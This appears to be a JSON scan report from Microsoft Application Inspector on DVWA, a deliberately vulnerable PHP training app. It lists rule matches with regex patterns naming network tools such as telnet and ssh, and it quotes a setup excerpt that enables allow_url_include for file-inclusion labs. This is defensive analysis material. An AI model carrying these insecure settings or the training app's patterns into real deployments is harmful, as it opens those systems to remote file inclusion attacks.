{
  "appVersion": "Microsoft Application Inspector 1.2.6+7599d8f90b",
  "resultCode": 0,
  "metaData": {
    "languages": {
      "php": 358,
      "html": 62,
      "javascript": 10,
      "build.xml": 1,
      "typescript": 1
    },
    "applicationName": "DVWA",
    "sourcePath": "/home/dev/tools/DVWA/",
    "sourceVersion": null,
    "authors": null,
    "description": null,
    "lastUpdated": "5/10/2020 12:19:36 AM",
    "dateScanned": "5/10/2020 1:11:51 AM",
    "filesAnalyzed": 111,
    "totalFiles": 584,
    "filesSkipped": 473,
    "filesAffected": 78,
    "totalMatchesCount": 283,
    "uniqueMatchesCount": 24,
    "packageTypes": [
      "uncompressed"
    ],
    "appTypes": [
      "web.application"
    ],
    "uniqueTags": [
      "Manual.mandatory",
      "Dependency.SourceInclude",
      "Data.DBMS.SQL",
      "OS.Network.Connection.Miscellaneous",
      "Miscellaneous.CodeHygiene.Comment.Suspicious",
      "Miscellaneous.OpenSourceLicense.GPL",
      "Authentication.General",
      "OS.Process.Multiprocessing",
      "Miscellaneous.CodeHygiene.Comment.Fix",
      "Cryptography.HashAlgorithm.Legacy",
      "Miscellaneous.CodeHygiene.Comment.Todo",
      "Functions.execute",
      "Config.knownweak",
      "Cryptography.Cipher.RSA",
      "Authorization.Permissions",
      "Cryptography.HashAlgorithm.SHA2",
      "Cryptography.HashAlgorithm.General",
      "Data.Sensitive.Secret",
      "Cryptography.Encoding.Base64",
      "Authorization.General",
      "OS.Process.DynamicExecution",
      "Data.Sensitive.Identification",
      "Data.Sensitive.UserAccount",
      "Functions.upload"
    ],
    "uniqueDependencies": [
      "include"
    ],
    "outputs": [],
    "targets": [],
    "OSTargets": [],
    "fileExtensions": [
      "php",
      "ini",
      "txt",
      "md",
      "htaccess",
      "gitignore",
      "ico",
      "html",
      "pdf",
      "dist",
      "css",
      "js",
      "png",
      "jpg",
      "",
      "xml",
      "gif",
      "json",
      "ser",
      "in"
    ],
    "cloudTargets": [],
    "CPUTargets": [],
    "tagCounters": [],
    "detailedMatchList": [
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/setup.php",
        "ruleId": "DH000004",
        "ruleName": "Manual mandatory",
        "ruleDescription": "Manual review mandatory",
        "pattern": "\\b(HIT_ME_RISK_MANUAL_MANDATED)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Manual.mandatory"
        ],
        "sample": "HIT_ME_RISK_MANUAL_MANDATED",
        "excerpt": "&lt;?php\n//HIT_ME_RISK_MANUAL_MANDATED\ndefine( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;phpids&#39; ) );\n\n",
        "startLocationLine": 2,
        "startLocationColumn": 3,
        "endLocationLine": 2,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/setup.php",
        "ruleId": "AI026500",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "(include|require) .*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
        "sample": "include",
        "excerpt": "\t&lt;br /&gt;\n\tIf you see disabled on either &lt;i&gt;allow_url_fopen&lt;/i&gt; or &lt;i&gt;allow_url_include&lt;/i&gt;, set the following in your php.ini file and restart Apache.&lt;br /&gt;\n\t&lt;pre&gt;&lt;code&gt;allow_url_fopen = On\nallow_url_include = On&lt;/code&gt;&lt;/pre&gt;\n\tThese are only required for the file inclusion labs so unless you want to play with those, you can ignore them.\n\n\t&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;\n\n\t&lt;!-- Create db button --&gt;\n",
        "startLocationLine": 85,
        "startLocationColumn": 11,
        "endLocationLine": 85,
        "endLocationColumn": 37
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/setup.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $session_token, &#39;setup.php&#39; );\n\n\tif( $DBMS == &#39;MySQL&#39; ) {\n\t\tinclude_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/DBMS/MySQL.php&#39;;\n\t}\n\telseif($DBMS == &#39;PGSQL&#39;) {\n\t\t// include_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/DBMS/PGSQL.php&#39;;\n\t\tdvwaMessagePush( &#39;PostgreSQL is not yet fully supported.&#39; );\n",
        "startLocationLine": 22,
        "startLocationColumn": 16,
        "endLocationLine": 22,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/setup.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $session_token, &#39;setup.php&#39; );\n\n\tif( $DBMS == &#39;MySQL&#39; ) {\n\t\tinclude_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/DBMS/MySQL.php&#39;;\n\t}\n\telseif($DBMS == &#39;PGSQL&#39;) {\n\t\t// include_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/DBMS/PGSQL.php&#39;;\n\t\tdvwaMessagePush( &#39;PostgreSQL is not yet fully supported.&#39; );\n\t\tdvwaPageReload();\n",
        "startLocationLine": 23,
        "startLocationColumn": 60,
        "endLocationLine": 23,
        "endLocationColumn": 65
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/instructions.php",
        "ruleId": "AI031600",
        "ruleName": "Network Connection: FTP, Telnet or Similar",
        "ruleDescription": "Network Connection",
        "pattern": "\\b(tftp|ntp\\.org|ntpupdate|imap|snmp|ftps|sftp|ftp|nntp|smtp|telnet|ssh|pop3|gopher)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Network.Connection.Miscellaneous"
        ],
        "sample": "ftp",
        "excerpt": "\n// Make links and obfuscate the referer...\n$instructions = preg_replace_callback(\n\t&#39;/((http|https|ftp):\\/\\/([[:alnum:]|.|\\/|?|=]+))/&#39;,\n\t&#39;urlReplace&#39;,\n\t$instructions\n);\n\n$instructions = nl2br( $instructions );\n",
        "startLocationLine": 34,
        "startLocationColumn": 17,
        "endLocationLine": 34,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/instructions.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\treturn dvwaExternalLinkUrlGet( $matches[1] );\n}\n\n// Make links and obfuscate the referer...\n$instructions = preg_replace_callback(\n\t&#39;/((http|https|ftp):\\/\\/([[:alnum:]|.|\\/|?|=]+))/&#39;,\n\t&#39;urlReplace&#39;,\n\t$instructions\n);\n",
        "startLocationLine": 32,
        "startLocationColumn": 19,
        "endLocationLine": 32,
        "endLocationColumn": 28
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/about.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "&lt;div class=\\&quot;body_padded\\&quot;&gt;\n\t&lt;h2&gt;About&lt;/h2&gt;\n\t&lt;p&gt;Version &quot; . dvwaVersionGet() . &quot; (Release date: &quot; . dvwaReleaseDateGet() . &quot;)&lt;/p&gt;\n\t&lt;p&gt;Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment&lt;/p&gt;\n\t&lt;p&gt;The official documentation for DVWA can be found &lt;a href=\\&quot;docs/DVWA_v1.3.pdf\\&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;\n\t&lt;p&gt;All material is copyright 2008-2015 RandomStorm &amp; Ryan Dewhurst.&lt;/p&gt;\n\n\t&lt;h2&gt;Links&lt;/h2&gt;\n\t&lt;ul&gt;\n",
        "startLocationLine": 16,
        "startLocationColumn": 53,
        "endLocationLine": 16,
        "endLocationColumn": 58
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/about.php",
        "ruleId": "AI027900",
        "ruleName": "Open Source License: GPL",
        "ruleDescription": "Open Source License: GPL",
        "pattern": "\\b(GNU\\ GENERAL\\ PUBLIC\\ LICENSE)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.OpenSourceLicense.GPL"
        ],
        "sample": "GNU General Public License",
        "excerpt": "\n\t&lt;h2&gt;License&lt;/h2&gt;\n\t&lt;p&gt;Damn Vulnerable Web Application (DVWA) is free software: you can redistribute it and/or modify\n\tit under the terms of the GNU General Public License as published by\n\tthe Free Software Foundation, either version 3 of the License, or\n\t(at your option) any later version.&lt;/p&gt;\n\t&lt;p&gt;The PHPIDS library is included, in good faith, with this DVWA distribution. The operation of PHPIDS is provided without support from the DVWA team. It is licensed under &lt;a href=\\&quot;&quot; . DVWA_WEB_PAGE_TO_ROOT . &quot;instructions.php?doc=PHPIDS-license\\&quot;&gt;separate terms&lt;/a&gt; to the DVWA code.&lt;/p&gt;\n\n\t&lt;h2&gt;Development&lt;/h2&gt;\n",
        "startLocationLine": 48,
        "startLocationColumn": 28,
        "endLocationLine": 48,
        "endLocationColumn": 54
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/ids_log.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_ROOT_TO_PHPIDS_LOG&#39;, &#39;external/phpids/&#39; . dvwaPhpIdsVersionGet() . &#39;/lib/IDS/tmp/phpids_log.txt&#39; );\ndefine( &#39;DVWA_WEB_PAGE_TO_PHPIDS_LOG&#39;, DVWA_WEB_PAGE_TO_ROOT.DVWA_WEB_ROOT_TO_PHPIDS_LOG );\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;PHPIDS Log&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;log&#39;;\n// $page[ &#39;clear_log&#39; ]; &lt;- Was showing error.\n",
        "startLocationLine": 9,
        "startLocationColumn": 26,
        "endLocationLine": 9,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/phpinfo.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\nphpinfo();\n\n?&gt;\n\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/logout.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\nif( !dvwaIsLoggedIn() ) {\t// The user shouldn&#39;t even be on this page\n\t// dvwaMessagePush( &quot;You were not logged in&quot; );\n\tdvwaRedirect( &#39;login.php&#39; );\n}\n\ndvwaLogout();\ndvwaMessagePush( &quot;You have logged out&quot; );\ndvwaRedirect( &#39;login.php&#39; );\n",
        "startLocationLine": 10,
        "startLocationColumn": 17,
        "endLocationLine": 10,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/logout.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\ndvwaLogout();\ndvwaMessagePush( &quot;You have logged out&quot; );\ndvwaRedirect( &#39;login.php&#39; );\n\n?&gt;\n\n",
        "startLocationLine": 15,
        "startLocationColumn": 16,
        "endLocationLine": 15,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/security.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;DVWA Security&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;security&#39;;\n\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/security.php",
        "ruleId": "AI036700",
        "ruleName": "OS: Multiprocessing / Multithreading",
        "ruleDescription": "OS: Multiprocessing / Multithreading",
        "pattern": "\\b(mutex|semaphore|thread|lock|fork)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.Multiprocessing"
        ],
        "sample": "lock",
        "excerpt": "\n$page[ &#39;body&#39; ] .= &quot;\n&lt;div class=\\&quot;body_padded\\&quot;&gt;\n\t&lt;h1&gt;DVWA Security &lt;img src=\\&quot;&quot; . DVWA_WEB_PAGE_TO_ROOT . &quot;dvwa/images/lock.png\\&quot; /&gt;&lt;/h1&gt;\n\t&lt;br /&gt;\n\n\t&lt;h2&gt;Security Level&lt;/h2&gt;\n\n\t{$securityHtml}\n",
        "startLocationLine": 86,
        "startLocationColumn": 72,
        "endLocationLine": 86,
        "endLocationColumn": 76
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Welcome&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;home&#39;;\n\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/index.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "$page[ &#39;body&#39; ] .= &quot;\n&lt;div class=\\&quot;body_padded\\&quot;&gt;\n\t&lt;h1&gt;Welcome to Damn Vulnerable Web Application!&lt;/h1&gt;\n\t&lt;p&gt;Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students &amp; teachers to learn about web application security in a controlled class room environment.&lt;/p&gt;\n\t&lt;p&gt;The aim of DVWA is to &lt;em&gt;practice some of the most common web vulnerabilities&lt;/em&gt;, with &lt;em&gt;various levels of difficultly&lt;/em&gt;, with a simple straightforward interface.&lt;/p&gt;\n\t&lt;hr /&gt;\n\t&lt;br /&gt;\n\n\t&lt;h2&gt;General Instructions&lt;/h2&gt;\n",
        "startLocationLine": 15,
        "startLocationColumn": 53,
        "endLocationLine": 15,
        "endLocationColumn": 58
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/index.php",
        "ruleId": "AI027400",
        "ruleName": "Hygiene: Fix Comment",
        "ruleDescription": "Hygiene: Fix Comment",
        "pattern": "fixme|broke|broken",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Fix"
        ],
        "sample": "Broke",
        "excerpt": "\t&lt;ul&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.itsecgames.com/&#39;, &#39;bWAPP&#39;) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://sourceforge.net/projects/mutillidae/files/mutillidae-project/&#39;, &#39;NOWASP&#39;) . &quot; (formerly known as &quot; . dvwaExternalLinkUrlGet( &#39;http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10&#39;, &#39;Mutillidae&#39; ) . &quot;)&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project&#39;, &#39;OWASP Broken Web Applications Project\n&#39;) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\t&lt;hr /&gt;\n\t&lt;br /&gt;\n&lt;/div&gt;&quot;;\n",
        "startLocationLine": 41,
        "startLocationColumn": 74,
        "endLocationLine": 41,
        "endLocationColumn": 79
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/index.php",
        "ruleId": "AI027400",
        "ruleName": "Hygiene: Fix Comment",
        "ruleDescription": "Hygiene: Fix Comment",
        "pattern": "fixme|broke|broken",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Fix"
        ],
        "sample": "Broke",
        "excerpt": "\t&lt;ul&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.itsecgames.com/&#39;, &#39;bWAPP&#39;) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://sourceforge.net/projects/mutillidae/files/mutillidae-project/&#39;, &#39;NOWASP&#39;) . &quot; (formerly known as &quot; . dvwaExternalLinkUrlGet( &#39;http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10&#39;, &#39;Mutillidae&#39; ) . &quot;)&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project&#39;, &#39;OWASP Broken Web Applications Project\n&#39;) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\t&lt;hr /&gt;\n\t&lt;br /&gt;\n&lt;/div&gt;&quot;;\n",
        "startLocationLine": 41,
        "startLocationColumn": 115,
        "endLocationLine": 41,
        "endLocationColumn": 120
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "DH000004",
        "ruleName": "Manual mandatory",
        "ruleDescription": "Manual review mandatory",
        "pattern": "\\b(HIT_ME_RISK_MANUAL_MANDATED)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Manual.mandatory"
        ],
        "sample": "HIT_ME_RISK_MANUAL_MANDATED",
        "excerpt": "&lt;?php\n//HIT_ME_RISK_MANUAL_MANDATED\ndefine( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;phpids&#39; ) );\n\n",
        "startLocationLine": 2,
        "startLocationColumn": 3,
        "endLocationLine": 2,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\ndvwaDatabaseConnect();\n\nif( isset( $_POST[ &#39;Login&#39; ] ) ) {\n\t// Anti-CSRF\n\tif (array_key_exists (&quot;session_token&quot;, $_SESSION)) {\n\t\t$session_token = $_SESSION[ &#39;session_token&#39; ];\n\t} else {\n\t\t$session_token = &quot;&quot;;\n",
        "startLocationLine": 10,
        "startLocationColumn": 21,
        "endLocationLine": 10,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t$session_token = &quot;&quot;;\n\t}\n\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $session_token, &#39;login.php&#39; );\n\n\t$user = $_POST[ &#39;username&#39; ];\n\t$user = stripslashes( $user );\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n",
        "startLocationLine": 18,
        "startLocationColumn": 58,
        "endLocationLine": 18,
        "endLocationColumn": 63
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\t}\n\n\t// Login failed\n\tdvwaMessagePush( &#39;Login failed&#39; );\n\tdvwaRedirect( &#39;login.php&#39; );\n}\n\n$messagesHtml = messagesPopAllToHtml();\n\n",
        "startLocationLine": 48,
        "startLocationColumn": 20,
        "endLocationLine": 48,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\n\t// Login failed\n\tdvwaMessagePush( &#39;Login failed&#39; );\n\tdvwaRedirect( &#39;login.php&#39; );\n}\n\n$messagesHtml = messagesPopAllToHtml();\n\nHeader( &#39;Cache-Control: no-cache, must-revalidate&#39;);    // HTTP/1.1\n",
        "startLocationLine": 49,
        "startLocationColumn": 17,
        "endLocationLine": 49,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\n\t\t&lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=UTF-8\\&quot; /&gt;\n\n\t\t&lt;title&gt;Login :: Damn Vulnerable Web Application (DVWA) v&quot; . dvwaVersionGet() . &quot;&lt;/title&gt;\n\n\t\t&lt;link rel=\\&quot;stylesheet\\&quot; type=\\&quot;text/css\\&quot; href=\\&quot;&quot; . DVWA_WEB_PAGE_TO_ROOT . &quot;dvwa/css/login.css\\&quot; /&gt;\n\n\t&lt;/head&gt;\n\n",
        "startLocationLine": 70,
        "startLocationColumn": 10,
        "endLocationLine": 70,
        "endLocationColumn": 15
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
